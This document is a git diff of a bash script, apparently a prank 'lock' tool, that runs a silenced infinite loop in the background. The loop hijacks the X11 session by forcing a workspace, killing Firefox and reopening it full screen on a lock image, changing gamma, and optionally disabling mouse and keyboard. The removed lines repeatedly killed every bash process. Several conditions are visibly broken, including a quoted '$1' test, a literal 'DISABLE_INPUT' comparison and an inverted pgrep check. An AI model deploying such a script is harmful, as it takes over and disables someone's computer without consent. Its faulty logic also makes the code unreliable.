@@ -1,6 +1,7 @@
 #!/bin/bash
 SCREEN=$(xrandr | grep ' connected' | cut -d' ' -f1);
 
+# Disable input using parameter 'disable'
 DISABLE_INPUT=0
 if ! [ -z '$1' ] && [[ $1 == 'disable' ]]
 then
@@ -12,9 +13,12 @@ function forceWorkspace {
 }
 
 function showImage {
-    killall -9 firefox;
-    sleep 0.2;
-    firefox --new-window https://raw.githubusercontent.com/MarcVillain/Confloose/master/images/Lock.gif;
+    if ! pgrep -x "firefox" > /dev/null
+    then
+        killall -9 firefox;
+        sleep 0.2;
+        firefox --new-window https://raw.githubusercontent.com/MarcVillain/Confloose/master/images/Lock.gif & disown
+    fi
 }
 
 function fullScreenFirefox {
@@ -42,18 +46,18 @@ function preventKeyboard {
     done < <(xinput | grep Keyboard | tr -d ' ' | tr '\t' ' ' | cut -d' ' -f2 | cut -d'=' -f2)
 }
 
-function preventBash {
-    killall -9 bash;
+function main {
+    while true; do
+        if [ DISABLE_INPUT = 1 ]
+        then
+            preventMouse;
+            preventKeyboard;
+        fi
+        forceWorkspace;
+        showImage;
+        updateGamma;
+        fullScreenFirefox;
+    done
 }
 
-while true; do forceWorkspace; done 2>&1>/dev/null &
-while true; do showImage; done 2>&1>/dev/null &
-while true; do updateGamma; done 2>&1>/dev/null &
-while true; do fullScreenFirefox; done 2>&1>/dev/null &
-while true; do preventBash; done 2>&1>/dev/null &
-if [ DISABLE_INPUT = 1 ]
-then
-    while true; do preventMouse; done 2>&1>/dev/null &
-    while true; do preventKeyboard; done 2>&1>/dev/null
-fi
-disown
+main 2>&1>/dev/null & disown
